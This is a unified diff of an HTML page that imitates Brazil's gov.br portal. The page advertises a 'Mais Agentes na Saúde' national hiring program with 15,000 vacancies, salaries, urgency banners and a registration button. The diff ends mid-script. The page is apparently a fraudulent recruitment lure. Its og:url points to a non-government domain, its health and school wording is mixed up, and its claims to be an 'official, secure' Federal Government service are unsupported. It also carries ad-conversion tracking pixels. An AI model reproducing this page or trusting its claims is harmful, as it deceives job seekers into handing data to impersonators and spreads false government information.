@@ -3,64 +3,58 @@
 <head></head>
 
 <body class="bg-white">
+
+
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistema Único de Saúde - SUS - gov.br</title>
-    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <title>Mais Agentes na Saúde - gov.br</title>
 
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-06L8ZR8789"></script>
     <script>
-        window.pixelId = "683bacfab352f4229dd7defd";
-        var a = document.createElement("script");
-        a.setAttribute("async", "");
-        a.setAttribute("defer", "");
-        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-        document.head.appendChild(a);
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+
+        gtag('js', new Date());
+
+        gtag('config', 'G-06L8ZR8789');
+
+        gtag('config', 'AW-17060128628');
+        gtag('config', 'AW-17060259955');
+        gtag('config', 'AW-17060206170');
+        gtag('config', 'AW-17205154926');
+        gtag('config', 'AW-17061488219');
+        gtag('config', 'AW-17061592417');
     </script>
 
 
-    <script src="3.4.16"></script>
-    <link rel="stylesheet" href="css/all.min.css">
-    <link href="rawline" rel="stylesheet">
 
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <script src="3.4.16"></script>
+
+    <link href="rawline" rel="stylesheet">
     <link rel="stylesheet" href="css/custom.css">
 
-    <meta name="description" content="Programa Nacional de Agentes da Saúde - Governo Federal">
-    <meta name="keywords" content="Saúde, governo federal, agentes Saúde, PNAE, vagas públicas">
-    <meta name="author" content="Governo Federal do Brasil">
-
-    <meta property="og:title" content="Mais Agentes da Saúde - gov.br">
-    <meta property="og:description" content="Programa Nacional de Agentes da Saúde do Governo Federal">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://gov.agentesdaeducacao.org/cadastro">
-
-    <link rel="icon" type="image/x-icon"
-        href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
 
 
-
+    <!-- Preserve Query Parameters Script -->
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            // Get current query parameters
             const currentParams = new URLSearchParams(window.location.search);
 
-            // Function to add query parameters to a URL
             function addQueryParams(url) {
                 if (!url) return url;
 
-                // Create URL object with absolute path
                 const urlObj = new URL(url, window.location.origin);
 
-                // Special handling for cadastro to resultados-busca navigation
-                if (window.location.pathname === '/cadastro' && url.includes('/resultados-busca')) {
-                    // Add CEP parameter if not already present
+                if (window.location.pathname === 'cadastro' && url.includes('/resultados-busca')) {
                     if (!urlObj.searchParams.has('cep')) {
                         urlObj.searchParams.set('cep', '72236001');
                     }
                 }
 
-                // Preserve existing parameters
                 currentParams.forEach((value, key) => {
-                    // Don't override CEP if it's already set
                     if (!(key === 'cep' && urlObj.searchParams.has('cep'))) {
                         urlObj.searchParams.set(key, value);
                     }
@@ -69,7 +63,6 @@
                 return urlObj.toString();
             }
 
-            // Add click event listeners to all links
             document.querySelectorAll('a').forEach(link => {
                 const originalHref = link.getAttribute('href');
                 if (originalHref && !originalHref.startsWith('#') && !originalHref.startsWith('javascript:')) {
@@ -83,7 +76,6 @@
                 }
             });
 
-            // Also handle form submissions
             document.querySelectorAll('form').forEach(form => {
                 form.addEventListener('submit', function (e) {
                     const formAction = form.getAttribute('action');
@@ -95,18 +87,18 @@
                 });
             });
 
-            // Debug log to check parameters
             console.log('Current URL:', window.location.href);
             console.log('Current Parameters:', Object.fromEntries(currentParams));
         });
     </script>
 
 
+    <!-- Header -->
     <header class="header-govbr">
         <div class="flex justify-between items-center px-4 py-3">
             <div class="flex items-center">
-                <a href="../index.htm" class="gov-logo">
-                    <img src="images/govbr.webp" alt="gov.br" class="h-8">
+                <a href="index.htm" class="gov-logo">
+                    <img src="images/1200px-Gov.br_logo.svg.png"  class="h-8">
                 </a>
             </div>
             <div class="flex items-center">
@@ -121,7 +113,7 @@
                 <button class="header-btn" id="apps-btn" aria-label="Aplicativos">
                     <i class="fas fa-th text-blue-900 mx-3"></i>
                 </button>
-                <a href="/login"
+                <a href="#"
                     class="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium">
                     <i class="fas fa-user mr-2"></i>
                     Entrar
@@ -129,23 +121,25 @@
             </div>
         </div>
 
-        <div class="flex justify-between items-center px-4 py-2 border-b border-blue-300">
+        <!-- Title Bar -->
+        <div class="flex justify-between items-center px-4 py-2 border-b border-gray-300">
             <div class="flex items-center">
                 <button class="header-btn" id="sidebar-toggle" aria-label="Menu lateral">
                     <i class="fas fa-bars text-blue-900 mr-3"></i>
                 </button>
-                <span class="text-blue-800 text-sm font-medium">Sistema Único de Saúde - SUS - gov.br</span>
+                <span class="text-gray-800 text-sm font-medium">Fundo Nacional de Desenvolvimento  Saúde</span>
             </div>
             <div class="flex items-center">
                 <button class="header-btn" id="voice-search-btn" aria-label="Busca por voz">
-                    <i class="fas fa-microphone text-green-900 mx-2"></i>
+                    <i class="fas fa-microphone text-blue-900 mx-2"></i>
                 </button>
                 <button class="header-btn" id="search-toggle-btn" aria-label="Pesquisar">
-                    <i class="fas fa-search text-green-900 mx-2"></i>
+                    <i class="fas fa-search text-blue-900 mx-2"></i>
                 </button>
             </div>
         </div>
 
+        <!-- Search Bar (hidden by default) -->
         <div id="search-bar" class="hidden bg-white border-b border-gray-300 px-4 py-3">
             <div class="flex items-center max-w-md mx-auto">
                 <div class="relative flex-1">
@@ -161,429 +155,274 @@
             </div>
         </div>
 
+        <!-- Breadcrumb -->
         <nav class="breadcrumb-nav flex items-center px-4 py-3 text-sm" aria-label="Navegação estrutural">
             <div class="flex flex-wrap items-center gap-1">
-                <a href="../index.htm" class="text-blue-700 hover:text-blue-800">
+                <a href="index.htm" class="text-blue-700 hover:text-blue-800">
                     <i class="fas fa-home"></i>
                 </a>
                 <span class="mx-1 text-gray-600">></span>
-                <a href="/acesso-informacao" class="text-blue-700 hover:text-blue-800 text-xs">Acesso à Informação</a>
+                <a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Acesso à Informação</a>
                 <span class="mx-1 text-gray-600">></span>
-                <a href="/acoes-programas" class="text-blue-700 hover:text-blue-800 text-xs">Ações e Programas</a>
+                <a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Ações e Programas</a>
                 <span class="mx-1 text-gray-600">></span>
-                <a href="/programas" class="text-blue-700 hover:text-blue-800 text-xs">Programas</a>
+                <a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Programas</a>
                 <span class="mx-1 text-gray-600">></span>
-                <a href="/bolsas-auxilios" class="text-blue-700 hover:text-blue-800 text-xs">Bolsas e Auxílios</a>
+                <a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Bolsas e Auxílios</a>
                 <span class="mx-1 text-gray-600">></span>
-                <a href="/lista-programas" class="text-blue-700 hover:text-blue-800 text-xs">Lista de Programas</a>
+                <a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Lista de Programas</a>
                 <span class="mx-1 text-gray-600">></span>
-                <span class="text-gray-800 text-xs font-medium">Mais Agentes da Saúde</span>
+                <span class="text-gray-800 text-xs font-medium">Mais Agentes na Saúde</span>
             </div>
         </nav>
     </header>
-    <main class="main-content">
-        <div class="px-4 py-4 max-w-4xl mx-auto">
-            <h1 class="text-3xl font-bold mb-2 text-blue-900">Cadastro - Sistema Único de Saúde (SUS)</h1>
-            <p class="text-sm text-gray-600">Publicado em 30/06/2025 14h30</p>
-            <p class="text-sm text-gray-600 mb-6">Atualizado em 30/06/2025 16h45</p>
 
-            <div class="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
-                <div class="flex items-center mb-3 text-green-700">
-                    <i class="fas fa-heart text-2xl mr-2"></i>
-                    <h2 class="text-xl font-bold">Informações do Processo Seletivo - SUS 2025</h2>
+    <!-- Main Content -->
+    <main class="main-content">
+
+        <div class="px-4 py-4">
+            <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Mais Agentes na Saúde</h1>
+
+            <div class="border-t border-b border-gray-300 py-3">
+                <div class="flex items-center mb-2">
+                    <span class="text-gray-700 mr-2 text-sm">Compartilhe:</span>
+                    <button class="share-btn text-blue-700 mx-1" data-platform="facebook"
+                        aria-label="Compartilhar no Facebook">
+                        <i class="fab fa-facebook-f"></i>
+                    </button>
+                    <button class="share-btn text-blue-700 mx-1" data-platform="twitter"
+                        aria-label="Compartilhar no Twitter">
+                        <i class="fab fa-twitter"></i>
+                    </button>
+                    <button class="share-btn text-blue-700 mx-1" data-platform="whatsapp"
+                        aria-label="Compartilhar no WhatsApp">
+                        <i class="fab fa-whatsapp"></i>
+                    </button>
+                    <button class="share-btn text-blue-700 mx-1" data-platform="link" aria-label="Copiar link">
+                        <i class="fas fa-link"></i>
+                    </button>
                 </div>
-                <div class="grid md:grid-cols-2 gap-6">
-                    <div>
-                        <h3 class="font-bold text-gray-800 mb-2">Formato da Prova</h3>
-                        <ul class="list-disc list-inside text-gray-700 ml-4">
-                            <li class="font-bold text-green-700">60 questões objetivas</li>
-                            <li class="font-bold text-green-700">Prova prática</li>
-                            <li class="font-bold text-green-700">Múltipla escolha</li>
-                        </ul>
+                <div class="text-gray-700 text-sm">
+                    <p>Publicado em 24/05/2025 17h37</p>
+                    <p>Atualizado em 24/05/2025 18h29</p>
+                </div>
+            </div>
+
+            <div class="py-4 content-text">
+                <h2 class="text-2xl font-bold mb-4">GOVERNO FEDERAL — MINISTÉRIO  Saúde</h2>
+                <h3 class="text-xl font-semibold mb-2" style="color: #1351B4;">PROGRAMA NACIONAL DE AGENTES  Saúde
+                    — PNAE</h3>
+
+                <!-- Image -->
+                <div class="mb-4">
+                    <img src="images/banner.jpg" class="w-full rounded-lg shadow-md">
+                </div>
+
+                <h4 class="text-lg font-medium mb-4">COMUNICADO OFICIAL — LANÇAMENTO NACIONAL</h4>
+
+
+
+                <p class="mb-4 text-gray-800">O Programa Nacional de Agentes  Saúde (PNAE) é uma medida em parceria
+                    entre o Governo Federal, Ministério  Saúde e Gestão dos Municípios. Gerando mais empregos, e
+                    garantindo mais qualidade para nossos alunos pois essa é uma <strong>missão nacional</strong> que
+                    oferece estabilidade, consolidação de funcionários e mais atenção as Escolas do Brasil.</p>
+
+                <p class="mb-4 text-gray-800">Foram aprovadas de primeira demanda <strong>15 Mil vagas</strong> que irá
+                    atender a <strong>5.565 Municípios</strong> de todo país, após a tomada de vagas e de acordo com a
+                    necessidade de profissionais em cada setor das escolas, será estipulada uma nova votação para a
+                    abertura do segundo processo de seleção de Profissionais.</p>
+
+                <p class="mb-6 text-gray-800">O PNAE mantém a proposta de democratizar o acesso ao serviço público, com
+                    aplicação de provas em todas as regiões do país e um sistema de seleção por blocos temáticos. A nova
+                    edição também traz avanços como a realização das provas em dois dias — <strong>provas objetivas
+                        previstas para 2 de Agosto</strong> e <strong>discursivas para 6 de Setembro</strong>, estas
+                    últimas apenas para os candidatos aprovados na primeira etapa.</p>
+
+                <div class="mb-6">
+                    <h6 class="text-lg font-medium text-gray-800 mb-4" style="color: #1351B4;">
+                        PROCESSO SELETIVO PÚBLICO 2025.2 - GERAL
+                    </h6>
+                    <hr class="border-gray-300 mb-4">
+
+                    <div class="mb-4">
+                        <h6 class="text-lg font-medium text-gray-800 mb-3" style="color: #1351B4;">
+                            SITUAÇÃO
+                        </h6>
+                        <p class="text-gray-700 mb-4">• EM ANDAMENTO, INSCRIÇÕES ABERTAS.</p>
                     </div>
-                    <div>
-                        <h3 class="font-bold text-gray-800 mb-2">Local da Prova</h3>
-                        <p class="text-gray-700">Unidade de Saúde mais próxima da sua residência</p>
-                        <p class="text-sm text-green-600 flex items-center mt-1">
-                            <i class="fas fa-info-circle mr-1"></i> O local exato será informado no cartão de confirmação, enviado por email após a confirmação da inscrição.
+
+                    <hr class="border-gray-300 mb-4">
+
+                    <div class="mb-4">
+                        <h6 class="text-lg font-medium text-gray-800 mb-3" style="color: #1351B4;">
+                            REQUISITOS BÁSICOS
+                        </h6>
+                        <p class="text-gray-700 mb-1">• Ensino Médio completo</p>
+                        <p class="text-gray-700 mb-1">• 18 anos ou mais - Requisito básico atendido</p>
+                        <p class="text-gray-700 mb-4">• Capacitação gratuita - Fornecida pelo programa</p>
+                    </div>
+
+                    <hr class="border-gray-300 mb-4">
+
+                    <div class="mb-4">
+                        <h6 class="text-lg font-medium text-gray-800 mb-3" style="color: #1351B4;">
+                            REMUNERAÇÕES
+                        </h6>
+                        <p class="text-gray-700 mb-1">• R$ 3.112,24 - R$ 4.985,15</p>
+                        <p class="text-gray-700 mb-1">• 30-40h semanais</p>
+                        <p class="text-gray-700 mb-4">• CLT + Benefícios</p>
+                    </div>
+
+                    <hr class="border-gray-300 mb-4">
+
+                    <div class="mb-4">
+                        <h6 class="text-lg font-medium text-gray-800 mb-3" style="color: #1351B4;">
+                            INSTITUIÇÃO ORGANIZADORA
+                        </h6>
+                        <p class="text-gray-700 mb-4">• CEBRASPE</p>
+                    </div>
+
+                    <hr class="border-gray-300 mb-4">
+
+                    <div class="mb-4">
+                        <h6 class="text-lg font-medium text-gray-800 mb-3" style="color: #1351B4;">
+                            CARGOS DISPONÍVEIS
+                        </h6>
+                        <div class="grid md:grid-cols-2 gap-1 text-sm">
+                            <p class="text-gray-700">• Auxiliar Administrativo</p>
+                            <p class="text-gray-700">• Auxiliar de Produção Escolar</p>
+                            <p class="text-gray-700">• Auxiliar de Secretaria</p>
+                            <p class="text-gray-700">• Auxiliar de Segurança Escolar</p>
+                            <p class="text-gray-700">• Auxiliar de Serviços de Limpeza</p>
+                            <p class="text-gray-700">• Auxiliar de Cozinha Escolar</p>
+                            <p class="text-gray-700">• Técnico em Manutenção Predial</p>
+                            <p class="text-gray-700">• Secretário Escolar (home office)</p>
+                        </div>
+                    </div>
+
+                    <hr class="border-gray-300 mb-4">
+
+                    <div class="mb-4">
+                        <h6 class="text-lg font-medium text-gray-800 mb-3" style="color: #1351B4;">
+                            BENEFÍCIOS GARANTIDOS
+                        </h6>
+                        <p class="text-gray-700">
+                            Vale-alimentação • Vale-transporte • Plano de saúde • Férias remuneradas • 13º salário •
+                            FGTS • Progressão de carreira
                         </p>
                     </div>
                 </div>
-            </div>
 
-            <div class="grid md:grid-cols-2 gap-6 mb-6">
-                <div class="bg-white border border-gray-300 rounded-lg p-4 shadow-sm">
-                    <h3 class="font-bold text-gray-800 mb-2">Data e Horário</h3>
-                    <p class="text-gray-700"><strong>Data:</strong> 15 de Setembro de 2025</p>
-                    <p class="text-gray-700"><strong>Horário:</strong> 14h às 18h</p>
-                    <p class="text-gray-700"><strong>Duração:</strong> 4 horas</p>
+                <!-- Seção de Urgência -->
+                <div class="mb-6">
+                    <h6 class="text-lg font-medium text-gray-800 mb-3" style="color: #1351B4;">
+                        VAGAS LIMITADAS POR REGIÃO
+                    </h6>
+                    <p class="text-gray-700">
+                        As inscrições serão encerradas assim que as vagas de cada município forem preenchidas.
+                    </p>
                 </div>
-                <div class="bg-white border border-gray-300 rounded-lg p-4 shadow-sm">
-                    <h3 class="font-bold text-gray-800 mb-2">Cronograma Importante</h3>
-                    <p class="text-gray-700"><strong>Inscrições:</strong> Abertas</p>
-                    <p class="text-gray-700"><strong>Cartão de confirmação:</strong> 01/09/2025</p>
-                    <p class="text-gray-700"><strong>Prova objetiva:</strong> 15/09/2025</p>
-                    <p class="text-gray-700"><strong>Resultado:</strong> 30/09/2025</p>
+
+                <!-- Botão de Cadastro -->
+                <div class="text-center my-8">
+                    <a onclick="redirect(event)" class="inline-block">
+                        <button
+                            class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded animate-pulse">
+                            <i class="fas fa-user-plus mr-2"></i>
+                            FAZER CADASTRO
+                            <i class="fas fa-arrow-right ml-2"></i>
+                        </button>
+                    </a>
+                    <script>
+                        function redirect(event) {
+                            event.preventDefault();
+                            var currentUrlParams = window.location.search;
+                            window.location.href = "cadastro" + currentUrlParams;
+                        }
+                    </script>
+                    <p class="text-blue-600 font-medium mt-3 text-sm">
+                        <i class="fas fa-clock mr-1"></i>
+                        Processo Oficial • Inscrições abertas • Vagas limitadas
+                    </p>
                 </div>
-            </div>
 
-            <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 p-4 mb-6 rounded-md">
-                <p class="font-bold flex items-center mb-2"><i class="fas fa-exclamation-triangle mr-2"></i> Importante:</p>
-                <ul class="list-disc list-inside ml-4">
-                    <li>Chegue ao local com <strong class="font-semibold">1 hora de antecedência</strong></li>
-                    <li>Leve documento oficial com foto</li>
-                    <li>Caneta esferográfica azul ou preta</li>
-                    <li>O cartão de confirmação será enviado por email</li>
-                </ul>
-            </div>
-
-    <main class="main-content">
-
-        <div id="validation-popup" class="fixed top-4 right-4 z-50 hidden">
-            <div class="bg-white border-2 border-gray-800 rounded-lg shadow-lg p-4 min-w-64">
-                <div class="flex items-center">
-                    <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-gray-800 mr-3"></div>
-                    <div>
-                        <p class="text-sm font-medium text-gray-800" id="validation-message">Validando dados...</p>
-                        <p class="text-xs text-gray-600" id="validation-details">Aguarde um momento</p>
-                    </div>
-                </div>
-                <div class="mt-2 bg-gray-200 rounded-full h-1">
-                    <div class="bg-gray-800 h-1 rounded-full transition-all duration-500" id="validation-progress"
-                        style="width: 0%"></div>
-                </div>
-            </div>
-        </div>
-        <div class="px-4 py-4">
-            <h1 class="text-3xl font-semibold mb-4 text-blue-800">Cadastro - Mais Agentes da Saúde</h1>
-
-            <div class="bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
-                <div class="flex items-start">
-                    <div class="ml-4 flex-1">
-                        <h2 class="text-lg font-semibold text-gray-800 mb-3">Termos de Participação e Autorização</h2>
-                        <div class="space-y-3 text-sm text-gray-700 mb-4">
-                            <p><strong>Antes de prosseguir, leia e aceite os seguintes termos:</strong></p>
-                            <ul class="list-disc list-inside space-y-1 ml-4">
-                                <li>Declaro que as informações fornecidas são verdadeiras e estou ciente das penalidades
-                                    por dados falsos.</li>
-                                <li>Autorizo a consulta de estabelecimentos educacionais próximos à minha localização.
-                                </li>
-                                <li>Concordo em participar do processo seletivo conforme critérios estabelecidos pelo
-                                    programa.</li>
-                                <li>Estou ciente de que a participação não garante a contratação, dependendo da
-                                    disponibilidade de vagas.</li>
-                                <li>Autorizo o uso dos meus dados pessoais para fins de seleção, conforme LGPD.</li>
+                <section class="mb-6">
+                    <h5 class="text-lg font-semibold mb-2">DETALHES ADICIONAIS</h5>
+                    <ul class="list-disc list-inside mb-4">
+                        <li>Benefícios garantidos conforme Consolidação das Leis do Trabalho (CLT) e regulamentações do
+                            Ministério do Trabalho:
+                            <ul class="list-disc list-inside ml-4">
+                                <li>Vale-alimentação;</li>
+                                <li>Vale-transporte;</li>
+                                <li>Férias remuneradas;</li>
+                                <li>13º salário;</li>
+                                <li>Contribuição previdenciária ao INSS.</li>
                             </ul>
-                        </div>
+                        </li>
+                    </ul>
+                </section>
 
-                        <div class="flex items-start">
-                            <input type="checkbox" id="aceitar-termos"
-                                class="mt-1 mr-3 h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
-                            <label for="aceitar-termos" class="text-sm font-medium text-gray-700 cursor-pointer">
-                                <strong>Declaro que li, compreendi e aceito todos os termos acima</strong> e autorizo a
-                                busca de dados educacionais na minha região para fins de participação no Programa
-                                Nacional de Agentes da Saúde (PNAE).
-                            </label>
-                        </div>
+                <section class="mb-6">
+                    <h5 class="text-lg font-semibold mb-2">ALCANCE NACIONAL</h5>
+                    <p class="mb-4">O programa terá abrangência em todos os municípios brasileiros, conforme adesão das
+                        Prefeituras, com previsão de início do processo seletivo ainda neste semestre. Todas as vagas
+                        serão ocupadas por meio de processo público classificatório, com etapas de avaliação objetiva,
+                        comprovação de requisitos e participação obrigatória no curso técnico de ambientação e formação
+                        básica.</p>
+                </section>
 
-                        <div class="mt-4 p-3 bg-white border border-gray-300 rounded-md">
-                            <div class="flex items-center">
-                                <i class="fas fa-info-circle text-blue-500 mr-2"></i>
-                                <span class="text-xs text-gray-600">
-                                    <strong>Programa oficial do Governo Federal:</strong> Este é um serviço oficial e
-                                    seguro. Seus dados são protegidos pela Lei Geral de Proteção de Dados (LGPD).
-                                </span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
+                <section class="mb-6">
+                    <h5 class="text-lg font-semibold mb-2">IMPACTO SOCIAL E FUNCIONAL</h5>
+                    <p class="mb-4">O PNAE visa não apenas ampliar o quadro funcional das escolas públicas municipais,
+                        mas também gerar emprego formal, qualificado e inclusivo para milhares de brasileiros,
+                        contribuindo para a redução da informalidade e o fortalecimento do vínculo entre a comunidade e
+                        aSaúde básica.</p>
+                </section>
 
-            <div id="secao-cep"
-                class="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-8 opacity-50 pointer-events-none transition-all duration-300">
-                <h2 class="text-xl font-semibold text-blue-800 mb-4">
-                    <i class="fas fa-map-marker-alt mr-2"></i>
-                    Consulte a Disponibilidade na sua Região
-                </h2>
-                <p class="text-gray-700 mb-6">
-                    Para se cadastrar, você precisa verificar a disponibilidade de vagas nas escolas municipais próximas
-                    à sua localização.
-                    Digita seu CEP abaixo para encontrarmos as unidades escolares em sua região.
+                <section class="mb-6">
+                    <h5 class="text-lg font-semibold mb-2">COMO PARTICIPAR</h5>
+                    <p class="mb-4">A abertura das inscrições será divulgada em canais oficiais do Governo Federal,
+                        portais das prefeituras e sites de instituições parceiras da execução do programa. O processo
+                        será oficial, público e transparente, com base em critérios objetivos e ampla concorrência.</p>
+                </section>
+
+                <blockquote
+                    class="font-bold mb-4 text-center text-blue-800 text-lg border-l-4 border-blue-600 pl-4 italic">
+                    "Saúde é compromisso de todos. Trabalho com dignidade é direito de cada um."
+                </blockquote>
+
+                <p class="mb-4">Com o Programa Nacional de Agentes  Saúde, o Governo Federal reafirma seu
+                    compromisso com o futuro  Saúde brasileira e a valorização dos cidadãos em todos os municípios.
                 </p>
 
-                <div class="max-w-md">
-                    <div class="flex flex-col sm:flex-row gap-3">
-                        <div class="flex-1">
-                            <label for="cep" class="block text-sm font-medium text-gray-700 mb-2">CEP</label>
-                            <input type="text" id="cep" name="cep" placeholder="00000-000" maxlength="9"
-                                style="font-size: 16px;"
-                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base">
-                        </div>
-                        <div class="sm:self-end">
-                            <button id="buscar-btn"
-                                class="w-full sm:w-auto bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-6 rounded-md transition-colors duration-200">
-                                <i class="fas fa-search mr-2"></i>
-                                Buscar
-                            </button>
-                        </div>
-                    </div>
+                <p class="mb-4">Para mais informações, acesse o portal oficial: <a href="http://www.gov.br/educacao"
+                        class="text-blue-600 hover:text-blue-800 underline">www.gov.br/educacao</a></p>
+
+            </div>
+
+            <!-- Success notification (hidden by default) -->
+            <div id="share-notification" class="share-notification hidden">
+                <div class="notification-content">
+                    <i class="fas fa-check-circle text-blue-600"></i>
+                    <span>Link copiado com sucesso!</span>
                 </div>
             </div>
 
-            <div id="resultados-busca" class="hidden">
-                <h3 class="text-lg font-semibold text-gray-800 mb-4">
-                    <i class="fas fa-school mr-2"></i>
-                    Escolas Municipais Próximas
-                </h3>
-                <div id="lista-escolas" class="grid gap-4 mb-8">
-                    </div>
-            </div>
-
-            <div id="quiz-cargo" class="hidden bg-gray-50 border border-gray-200 rounded-lg p-6">
-                <div class="bg-blue-600 text-white rounded-lg p-4 mb-6 text-center">
-                    <h2 class="text-2xl font-bold mb-2">
-                        <i class="fas fa-hand-point-right mr-2"></i>
-                        SELECIONE UMA OPÇÃO DE CARGO
-                    </h2>
-                    <p class="text-blue-100">Escolha o cargo disponível para sua região</p>
-                </div>
-
-                <h3 class="text-lg font-semibold text-gray-800 mb-4">
-                    <i class="fas fa-clipboard-list mr-2"></i>
-                    Cargos Disponíveis na sua Região
-                </h3>
-                <p class="text-gray-600 mb-6">Escolha o cargo que melhor se adequa ao seu perfil e experiência:</p>
-
-                <div class="space-y-4">
-                    <label
-                        class="flex items-start p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-blue-50 hover:border-blue-300 transition-colors">
-                        <input type="radio" name="cargo" value="agente-alimentacao" class="mt-1 mr-3">
-                        <div>
-                            <div class="font-medium text-gray-800">Agente de Alimentação Escolar</div>
-                            <div class="text-sm text-gray-600">Responsável pela preparação e distribuição da alimentação
-                                nas escolas</div>
-                            <div class="text-sm text-blue-600 font-medium mt-1">R$ 1.320,00 - R$ 1.650,00 • 40h semanais
-                            </div>
-                        </div>
-                    </label>
-
-                    <label
-                        class="flex items-start p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-blue-50 hover:border-blue-300 transition-colors">
-                        <input type="radio" name="cargo" value="auxiliar-educacao" class="mt-1 mr-3">
-                        <div>
-                            <div class="font-medium text-gray-800">Auxiliar de Saúde Infantil</div>
-                            <div class="text-sm text-gray-600">Apoio pedagógico e cuidados com crianças de 0 a 5 anos
-                            </div>
-                            <div class="text-sm text-blue-600 font-medium mt-1">R$ 1.412,00 - R$ 1.800,00 • 40h semanais
-                            </div>
-                        </div>
-                    </label>
-
-                    <label
-                        class="flex items-start p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-blue-50 hover:border-blue-300 transition-colors">
-                        <input type="radio" name="cargo" value="monitor-transporte" class="mt-1 mr-3">
-                        <div>
-                            <div class="font-medium text-gray-800">Monitor de Transporte Escolar</div>
-                            <div class="text-sm text-gray-600">Acompanhamento e segurança dos estudantes no transporte
-                            </div>
-                            <div class="text-sm text-blue-600 font-medium mt-1">R$ 1.100,00 - R$ 1.400,00 • 30h semanais
-                            </div>
-                        </div>
-                    </label>
-
-                    <label
-                        class="flex items-start p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-blue-50 hover:border-blue-300 transition-colors">
-                        <input type="radio" name="cargo" value="assistente-admin" class="mt-1 mr-3">
-                        <div>
-                            <div class="font-medium text-gray-800">Assistente Administrativo Educacional</div>
-                            <div class="text-sm text-gray-600">Apoio administrativo e secretarial nas unidades escolares
-                            </div>
-                            <div class="text-sm text-blue-600 font-medium mt-1">R$ 1.500,00 - R$ 1.900,00 • 40h semanais
-                            </div>
-                        </div>
-                    </label>
-                </div>
-
-                <div class="mt-6 text-center">
-                    <button id="confirmar-cadastro"
-                        class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-8 rounded-md transition-colors duration-200">
-                        <i class="fas fa-user-plus mr-2"></i>
-                        Confirmar Cadastro
-                    </button>
-                </div>
-            </div>
         </div>
-
-        <script>
-            document.addEventListener('DOMContentLoaded', function () {
-                const cepInput = document.getElementById('cep');
-                const buscarBtn = document.getElementById('buscar-btn');
-                const resultadosBusca = document.getElementById('resultados-busca');
-                const listaEscolas = document.getElementById('lista-escolas');
-                const quizCargo = document.getElementById('quiz-cargo');
-                const confirmarBtn = document.getElementById('confirmar-cadastro');
-                const aceitarTermos = document.getElementById('aceitar-termos');
-                const secaoCep = document.getElementById('secao-cep');
-
-                const savedCep = localStorage.getItem('cep');
-                if (savedCep) {
-                    cepInput.value = savedCep;
-                }
-
-                function getCurrentParams() {
-                    const params = new URLSearchParams(window.location.search);
-                    return Object.fromEntries(params.entries());
-                }
-
-                function buildUrl(baseUrl, params) {
-                    const search = new URLSearchParams();
-                    Object.entries(params).forEach(([key, value]) => {
-                        if (value !== undefined && value !== null && value !== '') {
-                            search.set(key, value);
-                        }
-                    });
-                    const qs = search.toString();
-                    if (!qs) return baseUrl;
-                    return baseUrl + (baseUrl.includes('?') ? '&' : '?') + qs;
-                }
-
-                aceitarTermos.addEventListener('change', function () {
-                    if (this.checked) {
-                        secaoCep.classList.remove('opacity-50', 'pointer-events-none');
-                        secaoCep.classList.add('opacity-100');
-                        setTimeout(() => {
-                            secaoCep.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                            setTimeout(() => {
-                                cepInput.focus();
-                            }, 800);
-                        }, 300);
-                    } else {
-                        secaoCep.classList.add('opacity-50', 'pointer-events-none');
-                        secaoCep.classList.remove('opacity-100');
-                        resultadosBusca.classList.add('hidden');
-                        quizCargo.classList.add('hidden');
-                        cepInput.value = '';
-                    }
-                });
-
-                cepInput.addEventListener('input', function (e) {
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (value.length > 5) {
-                        value = value.substring(0, 5) + '-' + value.substring(5, 8);
-                    }
-                    e.target.value = value;
-                    localStorage.setItem('cep', e.target.value);
-                });
-
-                buscarBtn.addEventListener('click', function () {
-                    if (!aceitarTermos.checked) {
-                        alert('Por favor, aceite os termos e condições antes de prosseguir.');
-                        return;
-                    }
-
-                    const cep = cepInput.value.replace(/\D/g, '');
-
-                    if (cep.length !== 8) {
-                        alert('Por favor, digite um CEP válido com 8 dígitos.');
-                        return;
-                    }
-
-                    const currentParams = getCurrentParams();
-                    currentParams.cep = cep;
-                    const url = buildUrl('resultado/index.html', currentParams);
-                    window.location.href = url;
-                });
-
-                confirmarBtn.addEventListener('click', function () {
-                    const cargoSelecionado = document.querySelector('input[name="cargo"]:checked');
-                    if (!cargoSelecionado) {
-                        alert('Por favor, selecione um cargo.');
-                        return;
-                    }
-                    alert('Cadastro confirmado! Em breve você receberá mais informações sobre o processo seletivo.');
-                });
-
-                function mostrarValidacao(mensagem, detalhes) {
-                    const popup = document.getElementById('validation-popup');
-                    const messageEl = document.getElementById('validation-message');
-                    const detailsEl = document.getElementById('validation-details');
